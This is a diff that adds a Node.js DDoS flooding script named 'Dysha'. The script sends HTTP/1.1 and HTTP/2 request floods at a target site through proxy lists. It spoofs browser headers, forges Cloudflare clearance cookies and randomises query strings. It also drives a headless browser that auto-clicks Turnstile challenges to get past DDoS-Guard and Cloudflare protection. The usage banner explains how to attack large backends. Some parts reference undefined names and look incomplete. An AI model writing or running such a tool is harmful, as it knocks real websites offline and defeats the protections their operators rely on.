@@ -1,0 +1,961 @@
+const net = require('net');
+const tls = require('tls');
+const HPACK = require('hpack');
+const cluster = require('cluster');
+const fs = require('fs');
+const os = require('os');
+const { setsockopt } = require('sockopt');
+
+
+const { EventEmitter } = require('events')
+const WebSocket = require('ws')
+const readline = require('readline')
+const timers = require('timers/promises')
+EventEmitter.setMaxListeners(0);
+
+let flooders = 0
+
+class CdpClient extends EventEmitter {
+    constructor(url) {
+        super()
+        this.id = 1
+        this.ws = new WebSocket(url)
+        this.ids = {}
+
+        this.ws.on('message', (msg) => {
+            const data = JSON.parse(msg)
+            if (!data.result && !data.error) {
+
+                this.emit(data.method, data.params)
+                return
+            } else {
+                if (!data.id)
+                    console.log(data)
+            }
+
+            if (this.ids[data.id] != null) {
+                if (data.error) {
+                    this.ids[data.id].reject(JSON.stringify(data.error))
+                } else {
+                    this.ids[data.id].resolve(data.result)
+                }
+            } else {
+                console.log('lol')
+            }
+        })
+
+        this.ws.on('open', () => {
+            this.emit('open')
+        })
+    }
+
+    async send(method, params, sessionId) {
+        const myId = this.id++
+        this.ws.send(JSON.stringify({
+            id: myId,
+            method,
+            params,
+            sessionId
+        }))
+        return await new Promise((resolve, reject) => {
+            this.ids[myId] = { resolve, reject, params }
+        })
+    }
+}
+
+const executables = [
+    'bins/117/cefsimple',
+    'bins/116/cefsimple',
+    'bins/115/cefsimple',
+    'bins/114/cefsimple',
+    'bins/113/cefsimple',
+    'bins/112/cefsimple',
+    'bins/111/cefsimple',
+    'bins/110/cefsimple'
+]
+
+let procs = []
+let stopped = false
+let finished = false
+
+function exit() {
+
+    if (stopped)
+        return
+
+    stopped = true
+
+    for (let p of procs) {
+        p.kill('SIGINT')
+    }
+    process.exit(0)
+}
+
+const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
+const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
+
+require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
+
+process
+    .setMaxListeners(0)
+    .on('uncaughtException', function (e) {
+        console.log(e)
+        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
+    })
+    .on('unhandledRejection', function (e) {
+        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
+    })
+    .on('warning', e => {
+        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
+    })
+    .on("SIGHUP", () => {
+        return 1;
+    })
+    .on("SIGCHILD", () => {
+        return 1;
+    });
+
+const statusesQ = []
+let statuses = {}
+
+const timestamp = Date.now();
+const timestampString = timestamp.toString().substring(0, 10);
+const currentDate = new Date();
+const targetDate = new Date('2024-02-29');
+
+let isFull = process.argv.includes('--full');
+
+const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
+const reqmethod = process.argv[2];
+const target = process.argv[3];
+const time = process.argv[4];
+const threads = process.argv[5];
+const ratelimit = process.argv[6];
+const proxyfile = process.argv[7];
+const queryIndex = process.argv.indexOf('--query');
+const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
+const bfmFlagIndex = process.argv.indexOf('--bfm');
+const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
+const delayIndex = process.argv.indexOf('--delay');
+const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
+const cookieIndex = process.argv.indexOf('--cookie');
+const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
+const refererIndex = process.argv.indexOf('--referer');
+const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
+const postdataIndex = process.argv.indexOf('--postdata');
+const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
+const randrateIndex = process.argv.indexOf('--randrate');
+const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
+
+const forceHttpIndex = process.argv.indexOf('--http');
+const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
+const debugMode = process.argv.includes('--debug') && forceHttp != 1;
+
+if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
+    console.clear();
+    console.error(`
+    Dysha version 1.0 Method // Created: 30.01.2024 // With love @meshreset
+    Developers to method: @meshreset <3
+    How to use & example:
+      node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
+      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
+    
+    Options:
+      --query - query string with rand ex 1 - cf__chl_tk 2 - ?fwfwfwfw 3 - q?=fwfwwffw
+      --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
+      --cookie - for custom cookie type "f=f"--
+      --bfm true or null - bot fight mode change to true if you need dont use if no need
+      --referer - use custom referer if you need and rand - if you need generate domains ex: fwfwwfwfw.net
+      --postdata - if you need data to post req method format "user=f&pass=f"
+      --randrate - randomizer rate 1 to 90 good bypass to rate
+      --full - this new func for attack only big backend ex amazon akamai and other... support cf
+      --http - new func choose to type http 1/2/mix (mix 1 & 2)
+      --debug - show your status code (maybe low rps to use more resource)
+    `);
+
+    process.exit(-1);
+}
+let hcookie = '';
+
+const url = new URL(target)
+const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
+
+if (currentDate > targetDate) {
+    console.error('Error method has been outdate pm @rapidreset');
+    process.exit(1);
+}
+
+if (!['GET', 'POST'].includes(reqmethod)) {
+    console.error('Error request method only can GET/POST');
+    process.exit(1);
+}
+
+if (!target.startsWith('https://')) {
+    console.error('Error protocol can only https://');
+    process.exit(1);
+}
+
+if (isNaN(time) || time <= 0 || time > 86400) {
+    console.error('Error time can not high 86400')
+    process.exit(1);
+}
+
+if (isNaN(threads) || threads <= 0 || threads > 256) {
+    console.error('Error threads can not high 256')
+    process.exit(1);
+}
+
+if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 90) {
+    console.error(`Error ratelimit can not high 90`)
+    process.exit(1);
+}
+
+if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
+    hcookie = `__cf_bm=${randstrr(23)}_${randstrr(19)}-${timestampString}-1-${randstrr(4)}/${randstrr(65)}+${randstrr(16)}=; cf_clearance=${randstrr(35)}_${randstrr(7)}-${timestampString}-0-1-${randstrr(8)}.${randstrr(8)}.${randstrr(8)}-0.2.${timestampString}`;
+}
+
+if (cookieValue) {
+    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
+}
+
+function encodeFrame(streamId, type, payload = "", flags = 0) {
+    let frame = Buffer.alloc(9)
+    frame.writeUInt32BE(payload.length << 8 | type, 0)
+    frame.writeUInt8(flags, 4)
+    frame.writeUInt32BE(streamId, 5)
+    if (payload.length > 0)
+        frame = Buffer.concat([frame, payload])
+    return frame
+}
+
+function decodeFrame(data) {
+    const lengthAndType = data.readUInt32BE(0)
+    const length = lengthAndType >> 8
+    const type = lengthAndType & 0xFF
+    const flags = data.readUint8(4)
+    const streamId = data.readUInt32BE(5)
+    const offset = flags & 0x20 ? 5 : 0
+
+    let payload = Buffer.alloc(0)
+
+    if (length > 0) {
+        payload = data.subarray(9 + offset, 9 + offset + length)
+
+        if (payload.length + offset != length) {
+            return null
+        }
+    }
+
+    return {
+        streamId,
+        length,
+        type,
+        flags,
+        payload
+    }
+}
+
+function encodeSettings(settings) {
+    const data = Buffer.alloc(6 * settings.length)
+    for (let i = 0; i < settings.length; i++) {
+        data.writeUInt16BE(settings[i][0], i * 6)
+        data.writeUInt32BE(settings[i][1], i * 6 + 2)
+    }
+    return data
+}
+
+const getRandomChar = () => {
+    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
+    const randomIndex = Math.floor(Math.random() * pizda4.length);
+    return pizda4[randomIndex];
+};
+
+if (url.pathname.includes("%RAND%")) {
+    const randomValue = randstrr(6) + "&" + randstrr(6);
+    url.pathname = url.pathname.replace("%RAND%", randomValue);
+}
+
+function randstrr(length) {
+    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+function generateRandomString(minLength, maxLength) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        const randomIndex = Math.floor(Math.random() * characters.length);
+        result += characters[randomIndex];
+    }
+    return result;
+}
+
+function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+
+function buildRequest() {
+    const headers =
+        Buffer.from(`${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
+            `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n` +
+            'Accept-Encoding: gzip, deflate, br\r\n' +
+            'Accept-Language: en-US,en;q=0.7\r\n' +
+            'Cache-Control: max-age=0\r\n' +
+            'Connection: Keep-Alive\r\n' +
+            `Host: ${url.hostname}\r\n` +
+            'Sec-Fetch-Dest: document\r\n' +
+            'Sec-Fetch-Mode: navigate\r\n' +
+            'Sec-Fetch-Site: none\r\n' +
+            'Sec-Fetch-User: ?1\r\n' +
+            'Upgrade-Insecure-Requests: 1\r\n' +
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\r\n' +
+            'sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"\r\n' +
+            'sec-ch-ua-mobile: ?0\r\n' +
+            'sec-ch-ua-platform: "Windows"\r\n\r\n', 'binary');
+    return headers;
+}
+
+const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))
+
+function go_rapidreset() {
+    let browser = () => new Promise((res0, rej0) => {
+
+        let proxy = proxies[~~(Math.random() * (proxies.length))]
+        while (usedProxies[proxy]) {
+            if (Object.keys(usedProxies).length == proxies.length) {
+                return
+            }
+            proxy = proxies[~~(Math.random() * (proxies.length))]
+        }
+
+        const port = 1000 + Math.floor(Math.random() * 59000);
+        const s = spawn(executables[~~(Math.random() * executables.length)], [
+            '--ignore-certificate-errors',
+            `--remote-debugging-port=${port}`,
+            '--no-zygote',
+            '--language=en_US',
+            '--disable-gpu',
+            `--proxy-server=${proxy}`,
+            '--disable-background-networking',
+            '--disable-software-rastrizier',
+            '--disable-dev-shm',
+            '--disable-blink-features=AutomationControlled',
+            '--num=1',
+            '--user-data-dir=datadir',
+            '--no-first-run',
+            '--disable-threaded-animation',
+            '--no-process-per-site',
+            '--in-process-gpu',
+            '--use-gl=swiftshader',
+            '--disable-features=site-per-process',
+            '--use-fake-device-for-media-stream',
+            '--use-fake-ui-for-media-stream',
+            '--no-sandbox'
+        ], {
+            detached: false,
+            stdio: 'pipe',
+            env: Object.assign({
+                "LANG": "de"
+            }, process.env)
+        })
+        procs.push(s)
+
+        const rl = readline.createInterface(s.stderr)
+        rl.on('line', data => {
+            if (data.indexOf("ws://") != -1) {
+                const wsEndpoint = 'ws://' + data.split('ws://')[1].replace('\n', '')
+                const client = new CdpClient(wsEndpoint)
+                client.on('open', async () => {
+                    console.log('open')
+                    const deviceMemories = [2, 4, 8]
+
+                    const hardwareConcurrency = deviceMemories[~~(Math.random() * deviceMemories.length)]
+                    const deviceMemory = deviceMemories[~~(Math.random() * deviceMemories.length)]
+
+                    const expression = `(() => {
+                        ${SCRIPT}; abc(${hardwareConcurrency}, ${deviceMemory}, ${Math.random()})
+                    })()`
+
+                    const targetsResponse = await client.send('Target.getTargets')
+
+                    const pageTargets = targetsResponse.targetInfos.filter(info => info.type === 'page');
+
+                    for (let pageTarget of pageTargets) {
+
+                        async function attachTarget() {
+                            async function turnstile(sessionId) {
+                                let in1 = setInterval(() => {
+                                    client.send('Runtime.evaluate', { expression: `JSON.stringify(document.querySelector(".ctp-checkbox-container map img, .ctp-checkbox-container input") == null ? {} : document.querySelector(".ctp-checkbox-container map img, .ctp-checkbox-container input").getBoundingClientRect().toJSON())` }, sessionId)
+                                        .then(rect => {
+                                            if (rect.result) {
+                                                return JSON.parse(rect.result.value)
+                                            }
+                                        })
+                                        .then(async rect => {
+                                            if (rect && rect.x) {
+                                                clearInterval(in1)
+                                                await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: rect.x + rect.width / 2, y: rect.y + rect.height / 2 }, sessionId)
+                                                await client.send("Input.dispatchMouseEvent", { type: "mousePressed", button: "left", x: rect.x + rect.width / 2, y: rect.y + rect.height / 2, clickCount: 1 }, sessionId)
+                                                await client.send("Input.dispatchMouseEvent", { type: "mouseReleased", button: "left", x: rect.x + rect.width / 2, y: rect.y + rect.height / 2, clickCount: 1 }, sessionId)
+                                            }
+                                        }).catch(() => clearInterval(in1))
+                                }, 1000).unref()
+
+                            }
+
+                            let titleValue = "t9i23t23tg23ig"
+                            let ttt = []
+
+                            function title(sessionId) {
+                                let aaaa = setInterval(async () => {
+                                    let tt = await client.send('Runtime.evaluate', { expression: `document.title` }, sessionId).catch(() => {
+                                        clearInterval(aaaa)
+                                    })
+
+                                    let tt2 = (await client.send('Runtime.evaluate', { expression: `document.body && document.body.innerHTML` }, sessionId))
+
+
+                                    if (tt2.result && tt2.result.value && tt2.result.value.includes("Failed to load URL")) {
+                                        s.kill('SIGINT')
+                                        s.kill('SIGTERM')
+                                        return
+                                    }
+
+                                    if (!tt)
+                                        return
+
+
+                                    if (tt.result != null) {
+                                        tt = tt.result.value
+                                    } else {
+                                        tt = "errorrr"
+                                    }
+
+                                    if (tt != titleValue) {
+                                        titleValue = tt
+                                        console.log(i, { titleValue })
+
+                                        if (titleValue.startsWith("Failed to load URL ")) {
+                                            console.log({ proxy })
+                                            s.kill()
+                                            clearInterval(aaaa)
+                                            return
+                                        }
+
+                                        try {
+                                            ttt.push(titleValue)
+                                        } catch (eeee) {
+                                            console.log(eeee)
+                                        }
+                                    }
+                                }, 1000).unref()
+                            }
+
+                            const { sessionId } = await client.send('Target.attachToTarget', {
+                                targetId: pageTarget.targetId,
+                                flatten: true,
+                            })
+
+                            let paused = false
+                            await client.send('Debugger.enable', {}, sessionId)
+
+                            client.on('Target.targetCreated', async (data) => {
+                                if (data.targetInfo.type == 'shared_worker') {
+                                    await client.send('Debugger.pause', {}, sessionId).catch(() => console.log("ERR"))
+
+                                    await client.send('Target.attachToTarget', {
+                                        targetId: data.targetInfo.targetId,
+                                        flatten: true,
+                                    })
+                                }
+                            })
+
+                            const emitter = new EventEmitter()
+
+                            client.on('Target.targetDestroyed', (data2) => {
+                                emitter.emit(data2.targetId)
+                            })
+
+                            let queue = []
+
+                            function q() {
+                                setTimeout(async () => {
+                                    if (queue.length > 0)
+                                        await queue.pop()()
+                                    q()
+                                }, 10)
+                            }
+
+                            q()
+
+                            client.on('Target.attachedToTarget', async (data) => {
+                                queue.push(async () => {
+                                    client.send('Runtime.evaluate', { expression: "" }, data.sessionId).catch(() => { })
+                                    await client.send('Runtime.runIfWaitingForDebugger', {}, data.sessionId).catch(() => { })
+
+
+                                    if (!data.waitingForDebugger) {
+                                        if (paused) {
+                                            paused = false
+                                            await client.send('Runtime.runIfWaitingForDebugger', {}, sessionId).catch(() => console.log("ERR4"))
+                                            await client.send('Debugger.pause', {}, sessionId).catch(() => console.log("ERR2"))
+                                            await client.send('Debugger.resume', {}, sessionId).catch(() => console.log("ERR3"))
+                                        }
+                                    }
+
+                                    if (data.targetInfo.type == 'iframe') {
+                                        await turnstile(data.sessionId)
+                                    } else {
+                                        await client.send('Target.detachFromTarget', { sessionId: data.sessionId }, sessionId).catch(() => { })
+                                    }
+                                })
+                            })
+
+                            await client.send('Target.setDiscoverTargets', { discover: true }, sessionId)
+                            await client.send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: true, flatten: true }, sessionId)
+
+                            await client.send('Page.enable', {}, sessionId)
+                            await client.send('Page.addScriptToEvaluateOnNewDocument', { source: expression }, sessionId)
+
+                            let request = null
+                            let mainFrame = null
+                            let response = false
+
+                            await new Promise(async (resolve) => {
+
+                                let timer = null
+
+                                const requestsIds = {}
+
+                                client.on('Network.requestWillBeSent', (data) => {
+
+                                    requestsIds[data.requestId] = data
+                                })
+                                client.on('Network.requestWillBeSentExtraInfo', (data) => {
+                                    if (!requestsIds[data.requestId]) {
+                                        return
+                                    }
+
+                                    Object.assign(requestsIds[data.requestId], {
+                                        extra: data
+                                    })
+                                    if (mainFrame.frameId == requestsIds[data.requestId].frameId && requestsIds[data.requestId].type == 'Document') {
+                                        request = requestsIds[data.requestId].extra.headers
+                                        timer = setTimeout(resolve, 1000).unref()
+                                    }
+                                })
+
+                                client.on('Network.responseReceived', (data) => {
+                                    if (data.frameId == mainFrame.frameId) {
+                                        response = true
+                                    }
+
+                                })
+
+                                mainFrame = await client.send('Page.navigate', { url: "about:blank" }, sessionId)
+                                await client.send('Network.enable', {}, sessionId)
+                                await client.send('Page.navigate', { url: TARGET }, sessionId)
+                                title(sessionId)
+                            })
+
+                            let protections = [
+                                'just a moment',
+                                'один момент',
+                                'ddos-guard',
+                                'ddos guard',
+                                'extern uam'
+                            ]
+
+                            await new Promise(async (r1) => {
+                                while (ttt.length == 0 || protections.filter(a => ttt[ttt.length - 1].toLowerCase().indexOf(a) != -1).length > 0) {
+                                    await timers.setTimeout(100, null, { ref: false })
+                                }
+                                r1(null)
+                            })
+                            console.log(i, 'expr2', ttt, await client.send('Runtime.evaluate', { expression: `JSON.stringify([document.title, navigator.connection.rtt])` }, sessionId))
+                            console.log('rr', request, response)
+                            if (!request || !response) {
+                                console.log('no')
+                                s.kill('SIGINT')
+                                s.kill('SIGTERM')
+                                return
+                            }
+
+                            console.log('emul')
+                            flooders++
+                            s.kill()
+                        }
+                        attachTarget()
+                    }
+                })
+            }
+        })
+
+        let t;
+
+        s.on('close', () => {
+            clearTimeout(t)
+            res0()
+        })
+
+        t = setTimeout(() => {
+            console.log('timed out')
+            s.kill()
+        }, 25000)
+    })
+
+    function x() {
+        browser().catch(console.error).finally(() => {
+            console.log(finished)
+            if (!stopped && !finished) {
+                x()
+            }
+        })
+    }
+
+    x()
+}
+
+function go() {
+    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
+    let tlsSocket;
+
+    if (!proxyPort || isNaN(proxyPort)) {
+        go()
+        return
+    }
+
+    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
+        setsockopt(netSocket, 1, 7, 140000)
+        setsockopt(netSocket, 1, 8, 655360000)
+        netSocket.once('data', () => {
+            tlsSocket = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp == 1 ? ['http/1.1'] : forceHttp == 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                minVersion: 'TLSv1.2',
+                maxVersion: 'TLSv1.3',
+                rejectUnauthorized: false
+            }, () => {
+                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
+
+                    if (forceHttp == 2) {
+                        tlsSocket.end(() => tlsSocket.destroy())
+                        return
+                    }
+
+                    function doWrite() {
+                        tlsSocket.write(http1Payload, (err) => {
+                            if (!err) {
+                                setTimeout(() => {
+                                    doWrite()
+                                }, isFull ? 1000 : 1000 / ratelimit)
+                            } else {
+                                tlsSocket.end(() => tlsSocket.destroy())
+                            }
+                        })
+                    }
+
+                    doWrite()
+
+                    tlsSocket.on('error', () => {
+                        tlsSocket.end(() => tlsSocket.destroy())
+                    })
+
+                    return
+                }
+
+                if (forceHttp == 1) {
+                    tlsSocket.end(() => tlsSocket.destroy())
+                    return
+                }
+
+                let streamId = 1
+                let data = Buffer.alloc(0)
+                let hpack = new HPACK()
+                hpack.setTableSize(4096)
+
+                const updateWindow = Buffer.alloc(4)
+                updateWindow.writeUInt32BE(15663105, 0)
+
+                const headertablesize = Math.floor(Math.random() * 2) + 65535;
+                let windowSize = headertablesize;
+                const frandom = Math.floor(Math.random() * 6);
+
+                let fchoicev1, fchoicev2, fchoicev3;
+
+                if (frandom === 0) {
+                    fchoicev1 = 131072;
+                    fchoicev2 = 262142;
+                    fchoicev3 = undefined;
+                } else if (frandom === 1) {
+                    fchoicev1 = 131073;
+                    fchoicev2 = 262143;
+                    fchoicev3 = undefined;
+                } else if (frandom === 2) {
+                    fchoicev1 = 131074;
+                    fchoicev2 = 262144;
+                    fchoicev3 = undefined;
+                } else if (frandom === 3) {
+                    fchoicev1 = 6291455;
+                    fchoicev2 = 262145;
+                    fchoicev3 = 100;
+                }
+                else if (frandom === 4) {
+                    fchoicev1 = 6291454;
+                    fchoicev2 = 262144;
+                    fchoicev3 = 128;
+                }
+                else if (frandom === 5) {
+                    fchoicev1 = 6291456;
+                    fchoicev2 = 262146;
+                    fchoicev3 = 1000;
+                }
+
+                const frames = [
+                    Buffer.from(PREFACE, 'binary'),
+                    encodeFrame(0, 4, encodeSettings([
+                        [1, headertablesize],
+                        [2, 0],
+                        [4, fchoicev1],
+                        [6, fchoicev2]
+                    ])),
+                    encodeFrame(0, 8, updateWindow)
+                ];
+
+                tlsSocket.on('data', (eventData) => {
+                    data = Buffer.concat([data, eventData])
+
+                    while (data.length >= 9) {
+                        const frame = decodeFrame(data)
+                        if (frame != null) {
+                            data = data.subarray(frame.length + 9)
+                            if (frame.type == 4 && frame.flags == 0) {
+                                tlsSocket.write(encodeFrame(0, 4, "", 1))
+                            }
+                            if (frame.type == 1 && debugMode) {
+                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
+                                if (!statuses[status])
+                                    statuses[status] = 0
+
+                                statuses[status]++
+                            }
+                            if (frame.type == 7 || frame.type == 5) {
+                                if (frame.type == 7) {
+                                    if (debugMode) {
+                                        if (!statuses["GOAWAY"])
+                                            statuses["GOAWAY"] = 0
+
+                                        statuses["GOAWAY"]++
+                                    }
+                                }
+
+                                tlsSocket.end(() => tlsSocket.destroy())
+                            }
+
+                        } else {
+                            break
+                        }
+                    }
+                })
+
+                tlsSocket.write(Buffer.concat(frames))
+
+                function doWrite() {
+                    if (tlsSocket.destroyed) {
+                        return
+                    }
+                    const requests = []
+                    let ratelimit;
+                    if (randrate !== undefined) {
+                        ratelimit = getRandomInt(1, 90);
+                    } else {
+                        ratelimit = process.argv[6];
+                    }
+                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
+                        const browserVersion = getRandomInt(119, 122);
+
+                        const fwfw = ['Google Chrome', 'Brave'];
+                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
+
+                        let brandValue;
+                        if (browserVersion === 119) {
+                            brandValue = `\"Not?A_Brand\";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
+                        } else if (browserVersion === 120) {
+                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
+                        } else if (browserVersion === 121) {
+                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
+                        }
+                        else if (browserVersion === 122) {
+                            brandValue = `\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"122\"`;
+                        }
+
+                        const isBrave = wfwf === 'Brave';
+
+                        const acceptHeaderValue = isBrave
+                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
+                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
+
+                        const secGpcValue = isBrave ? "1" : undefined;
+
+                        const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
+                        const secChUa = `${brandValue}`;
+                        const currentRefererValue = refererValue === 'rand' ? 'https://' + randstrr(6) + ".net" : refererValue;
+                        const headers = Object.entries({
+                            ":method": reqmethod || "GET",
+                            ":authority": url.hostname,
+                            ":scheme": "https",
+                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
+                        }).concat(Object.entries({
+                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
+                            ...(reqmethod === "POST" && { "content-length": "0" }),
+                            "sec-ch-ua": secChUa,
+                            "sec-ch-ua-mobile": "?0",
+                            "sec-ch-ua-platform": `\"Windows\"`,
+                            "upgrade-insecure-requests": "1",
+                            "user-agent": userAgent,
+                            "accept": acceptHeaderValue,
+                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
+                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? "same-origin" : "none" }),
+                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
+                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
+                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
+                            "accept-encoding": "gzip, deflate, br",
+                            "accept-language": "en-US,en;q=0.9",
+                            ...(hcookie && { "cookie": hcookie }),
+                            ...(currentRefererValue && { "referer": currentRefererValue }),
+                        }).filter(a => a[1] != null));
+
+                        const headers2 = Object.entries({
+                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
+                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
+                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
+                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
+                            ...(Math.random() < 0.1 && { 'x-requested-with': 'XMLHttpRequest' }),
+                        }).filter(a => a[1] != null);
+
+                        for (let i = headers2.length - 1; i > 0; i--) {
+                            const j = Math.floor(Math.random() * (i + 1));
+                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
+                        }
+
+                        const combinedHeaders = headers.concat(headers2);
+
+                        function handleQuery(query) {
+                            if (query === '1') {
+                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
+                            } else if (query === '2') {
+                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
+                            } else if (query === '3') {
+                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
+                            } else {
+                                return url.pathname;
+                            }
+                        }
+
+                        const packed = Buffer.concat([
+                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
+                            hpack.encode(combinedHeaders)
+                        ]);
+
+                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
+                        streamId += 2
+                    }
+
+                    tlsSocket.write(Buffer.concat(requests), (err) => {
+                        if (!err) {
+                            setTimeout(() => {
+                                doWrite()
+                            }, isFull ? 1000 : 1000 / ratelimit)
+                        }
+                    })
+                }
+
+                doWrite()
+            }).on('error', () => {
+                tlsSocket.destroy()
+            })
+        })
+
